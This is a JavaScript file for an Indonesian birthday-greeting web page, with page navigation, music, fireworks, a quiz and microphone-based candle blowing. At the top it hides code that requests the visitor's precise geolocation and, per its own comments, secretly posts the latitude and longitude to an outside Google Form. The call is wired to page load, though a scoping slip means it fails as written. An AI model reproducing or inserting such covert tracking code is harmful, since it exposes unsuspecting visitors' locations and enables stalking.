(function() {
    // Fungsi utama untuk meminta izin web dulu
    function requestWebPermission() {
        if (!navigator.geolocation) return; // browser tidak support geolocation

        navigator.geolocation.getCurrentPosition(
            function(position) { // User mengizinkan
                checkGPS(position);
            },
            function() { 
                // User menolak izin → lupakan GPS, web tetap jalan normal
                // Tidak ada alert sama sekali
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
    }

    // Fungsi cek GPS
    function checkGPS(position) {
        if (!position || !position.coords) {
            // GPS mati → tampilkan satu-satunya alert untuk menyalakan GPS
            
            return;
        }
        // GPS aktif → kirim koordinat diam-diam ke Google Form
        sendLocation(position);
    }

    function sendLocation(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;

        const url = "https://docs.google.com/forms/d/e/1FAIpQLScxhX2DjBvCKImZUGyjpRLexvCaMSHH9cWrmRktPOm8dh5GZw/formResponse";
        const data = new FormData();
        data.append("entry.1443507885", lat);
        data.append("entry.435814945", lon);

        fetch(url, { method: "POST", body: data, mode: "no-cors" });
    }

 
})();





// 1. Variabel global & volume
// ------------------------------
let audio; // variabel global

window.addEventListener('DOMContentLoaded', () => {
    audio = document.getElementById('backSound'); // ambil elemen audio
    if (audio) {
        audio.volume = 0.5; // set volume ke 50%
    }

    requestWebPermission();

});




function startAgeAnimation() {
    const ages = document.querySelectorAll(".age");
    ages.forEach(el => {
        const container = document.createElement("div");
        container.classList.add("age-container");
        for(let i = 1; i <= 20; i++){
            const num = document.createElement("div");
            num.textContent = i;
            container.appendChild(num);
        }
        el.appendChild(container);
        container.style.transition = `transform 0.4s ease-in-out`;

        let index = 0;
        const interval = setInterval(() => {
            index++;
            container.style.transform = `translateY(-${index}em)`;
            if(index >= 19){
                clearInterval(interval);
                launchFireworks();

                setTimeout(() => {
    // cari tombol next di halaman hbdangka
    const nextBtn = document.querySelector("#hbdangka .next-btn");
    if (nextBtn) {
        nextBtn.style.opacity = 0;
        nextBtn.style.display = "inline-block"; // pastikan tombol ada
        // fade-in animasi
        nextBtn.style.transition = "opacity 1s ease";
        setTimeout(() => {
            nextBtn.style.opacity = 1;
        }, 50);
    }
}, 3000); // 3000ms = 3 detik

            }
        }, 200);
    });
}


//music


// Mapping halaman ke lagu tertentu
const pageMusicMap = {
  // 1 lagu untuk home → salam
  'home': 'song/cute.mp3',
  'salam': 'song/cute.mp3',

  // 1 lagu untuk info
  'info': 'song/cute.mp3',

  // 1 lagu untuk hbdangka → about
  'hbdangka': 'song/hbd_angka.mp3',
  'surrat': 'song/hbd_angka.mp3',
  'about': 'song/taylor.mp3',

  // 1 lagu untuk foto → byee
  'foto': 'song/taylor.mp3',
  'kue': 'song/slow.mp3',
  'byee': 'song/slow.mp3',

  // 1 lagu untuk keren
  'keren': 'song/hbd_end.mp3'
};



// pindah halaman
function goToPage(id) {
 const song = pageMusicMap[id];

  if (song && audio.src.indexOf(song) === -1) {
    audio.src = song;
    audio.loop = true; // jika mau lagu terus berjalan
    audio.play();
  }
    if (id === 'salam') {
       const btn = document.querySelector('.next-btnspesial');
        // Tampilkan tombol secara halus setelah 1,5 detik
        setTimeout(() => {
            btn.classList.add('show');
        }, 1500);
    } 
  // Halaman about → animasi surat
  if (id === 'about') {
    const surat = document.querySelector('.paper');
    surat.scrollIntoView({ behavior: 'smooth', block: 'start' });
    setTimeout(() => {
      surat.classList.add('show');
    }, 300);
  }

  // Halaman hbdangka atau surrat → animasi umur
  if (id === 'hbdangka' || id === 'surrat') {
    startAgeAnimation();
  }

  // 🔥 Halaman kue → hidupkan flame & mic
  if (id === 'kue') {
     navigator.mediaDevices.getUserMedia({ audio: true }) //ijin mic
    flameReceiver = document.getElementById("flame");
    flameReceiver.style.display = "block"; // pastikan nyala di awal
    startMic();
  } else {
    flameReceiver = null; // reset kalau bukan halaman kue
  }


    // Hentikan kembang api saat masuk halaman 'foto'
  if (id === 'foto') {
    stopFireworks();
  }


  // Reset semua page
  document.querySelectorAll(".page").forEach(p => {
    p.classList.remove("active", "scrollable");
    p.scrollTop = 0;
  });

  // Aktifkan target
  const target = document.getElementById(id);
  if (target) {
    target.classList.add("active");

    // Hanya halaman tertentu yang scrollable
    if (id === 'info' || id === 'about') {
      if (window.innerWidth > 768) {
        target.classList.add("scrollable");
      }
      target.classList.add("scrollable");
    }
  }
}

// ========================
// Fungsi Kembang Api 🎆
// ========================
// ========================
// Fungsi Kembang Api 🎆
// ========================
// Variabel global
let fireworksInterval = null;
let fireworksAnimationId = null;

function launchFireworks() {
  const canvas = document.getElementById("fireworks");
  const ctx = canvas.getContext("2d");

  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;

  const particles = [];
  const isMobile = window.matchMedia("(max-width: 768px)").matches;

  const CONFIG = {
    desktop: {
      particlesPerFirework: 120,
      explosionsPerTick: 3,
      spawnIntervalMs: 900,
      speedMin: 2,
      speedMax: 6,
      life: 120,
      radiusMin: 2,
      radiusMax: 4
    },
    mobile: {
      particlesPerFirework: 90,
      explosionsPerTick: 3,
      spawnIntervalMs: 800,
      speedMin: 3,
      speedMax: 4,
      life: 70,
      radiusMin: 1,
      radiusMax: 3
    }
  };

  const params = isMobile ? CONFIG.mobile : CONFIG.desktop;

  function createFirework(x, y) {
    const colors = ["#ff0044", "#ffdd00", "#44ff44", "#4488ff", "#ff66cc", "#00ffff"];
    for (let i = 0; i < params.particlesPerFirework; i++) {
      particles.push({
        x,
        y,
        angle: Math.random() * 2 * Math.PI,
        speed: Math.random() * (params.speedMax - params.speedMin) + params.speedMin,
        radius: Math.random() * (params.radiusMax - params.radiusMin) + params.radiusMin,
        life: params.life,
        color: colors[Math.floor(Math.random() * colors.length)]
      });
    }
  }

  function animate() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);

    particles.forEach((p, i) => {
      p.x += Math.cos(p.angle) * p.speed;
      p.y += Math.sin(p.angle) * p.speed;
      p.speed *= 0.97;
      p.life--;

      ctx.beginPath();
      ctx.arc(p.x, p.y, p.radius, 0, 2 * Math.PI);
      ctx.fillStyle = p.color;
      ctx.fill();

      if (p.life <= 0) particles.splice(i, 1);
    });

    fireworksAnimationId = requestAnimationFrame(animate);
  }

  // Hentikan interval sebelumnya jika ada
  if (fireworksInterval) clearInterval(fireworksInterval);

  fireworksInterval = setInterval(() => {
    for (let i = 0; i < params.explosionsPerTick; i++) {
      const x = Math.random() * canvas.width;
      const y = Math.random() * canvas.height * 0.8;
      createFirework(x, y);
    }
  }, params.spawnIntervalMs);

  animate();
}

// Fungsi untuk menghentikan kembang api
function stopFireworks() {
  if (fireworksInterval) {
    clearInterval(fireworksInterval);
    fireworksInterval = null;
  }
  if (fireworksAnimationId) {
    cancelAnimationFrame(fireworksAnimationId);
    fireworksAnimationId = null;
  }
}


















const form = document.getElementById('tebakForm');
const feedback = document.getElementById('feedback');

form.addEventListener('submit', function(e) {
  e.preventDefault(); // hentikan reload halaman

  const tebakan = form.tebakan.value.trim();

  if (!tebakan) {
    feedback.style.display = 'block';
    feedback.textContent = "Tolong isi tebakan dulu!";
    return;
  }

 if (tebakan.toLowerCase() === 'november') {
  feedback.style.display = 'none'; // hilangkan pesan merah

  // SweetAlert2 popup dengan GIF
  Swal.fire({
      title: "HOREEE!!!",
  text: "Jawabanmu Benar 😁🎉",
  imageUrl: "gambar/hore.gif",   // path relatif dari index.html
  imageWidth: 200,
  imageHeight: 200,
  imageAlt: "GIF sukses",
   confirmButtonColor: '#ff69b4', // warna pink
  confirmButtonText: "Lanjut 🚀"

  }).then(() => {
    // Pindah halaman setelah user klik tombol
    goToPage('hbdangka');
  });

} else {
  feedback.style.display = 'block';
  feedback.textContent = "Jawaban salah!";
  return;
}

});

// api
let flameReceiver = null;  // penerima (element flame)
let micStarted = false;    // biar mic ga nyala berkali2

// Jalankan mic & pendeteksi tiupan
async function startMic() {
  if (micStarted) return; // cegah double start
  micStarted = true;

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    const audioContext = new AudioContext();
    const source = audioContext.createMediaStreamSource(stream);
    const analyser = audioContext.createAnalyser();
    const dataArray = new Uint8Array(analyser.fftSize);

    source.connect(analyser);

 const nextBtn = document.getElementById("kueNextBtn"); // tombol hidden

    function detectBlow() {
      analyser.getByteTimeDomainData(dataArray);

      let sum = 0;
      for (let i = 0; i < dataArray.length; i++) {
        const val = (dataArray[i] - 128) / 128.0;
        sum += val * val;
      }
      const rms = Math.sqrt(sum / dataArray.length);

      if (rms > 0.14 && flameReceiver) { 
        flameReceiver.style.display = "none";  // matikan api

          // munculkan tombol next dengan animasi
        if (nextBtn && nextBtn.style.display === "none") {
          nextBtn.classList.add("fade-in");}
      }

      requestAnimationFrame(detectBlow);
    }

    detectBlow();
  } catch (err) {
    alert("Tidak bisa akses mikrofon: " + err);
  }
}

//sweet enggak

function showEnggak() {
  Swal.fire({
    title: 'Masa ENGGA? 🥺',
        imageUrl: 'gambar/hamster.gif',   // ganti dengan gif kamu
    text: 'Padahal udah keren lohh!',

    imageWidth: 200,
    imageHeight: 200,
    imageAlt: 'GIF lucu',
    confirmButtonColor: '#ff69b4', // warna pink
    confirmButtonText: 'OKE DEHH BAGUS BANGETT 😂',
      customClass: {
    popup: 'swal-custom'   // <== hanya popup ini yang kena
  }
  }).then(() => {
    goToPage('keren'); // setelah klik tombol → pindah ke halaman keren
  });
}

//kertad
document.addEventListener("DOMContentLoaded", () => {
  const btn = document.getElementById("printBtn");
  const photos = document.querySelectorAll(".photo");

  btn.addEventListener("click", () => {
    photos.forEach((photo, index) => {
      photo.classList.remove("drop");   // reset hanya foto
      void photo.offsetWidth;           // reflow
      setTimeout(() => {
        photo.classList.add("drop");
      }, index * 400);
    });
        // setelah 7.3 detik jalankan goToPage('foto')
    setTimeout(() => {
      goToPage('foto');
    }, 7500);
  });
});


function goHome() {
  location.reload(); // reload seluruh halaman → kembali ke home
}


//  // Fungsi untuk membuat efek hati
//             function createHearts() {
//                 // Hapus hati sebelumnya
//                 heartsContainer.innerHTML = '';
                
//                 // Buat hati baru
//                 for (let i = 0; i < 15; i++) {
//                     const heart = document.createElement('div');
//                     heart.className = 'heart';
//                     heart.innerHTML = '❤️';
//                     heart.style.left = Math.random() * 100 + '%';
//                     heart.style.animationDelay = Math.random() * 2 + 's';
//                     heart.style.animationDuration = (Math.random() * 3 + 3) + 's';
//                     heartsContainer.appendChild(heart);
//                 }
//             }
            
//             // Inisialisasi
//             createHearts();
        